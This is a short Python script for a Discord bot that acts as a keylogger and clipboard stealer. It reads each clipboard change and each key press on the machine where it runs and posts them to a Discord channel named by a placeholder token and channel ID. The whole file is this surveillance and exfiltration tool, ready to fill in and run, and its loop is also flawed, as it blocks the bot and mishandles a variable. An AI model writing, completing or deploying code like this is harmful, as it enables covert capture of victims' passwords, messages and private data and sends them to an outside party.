import discord
import pyperclip
import time
import keyboard

# Replace 'your_token_here' with your actual bot token
TOKEN = 'your_token_here'
CHANNEL_ID = your_channel_id  # Replace with your channel ID

intents = discord.Intents.default()
intents.messages = True
bot = discord.Client(intents=intents)

last_content = None

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    channel = bot.get_channel(CHANNEL_ID)

    while True:
        # Check for clipboard changes
        clipboard_content = pyperclip.paste()
        
        if clipboard_content != last_content:
            await channel.send(f"Clipboard content:\n{clipboard_content}")
            last_content = clipboard_content
            
        # Check for any key press
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            await channel.send(f"Key pressed: {event.name}")  # Send the specific key that was pressed
        
        time.sleep(1)  # Adjust the interval as needed

bot.run(TOKEN)
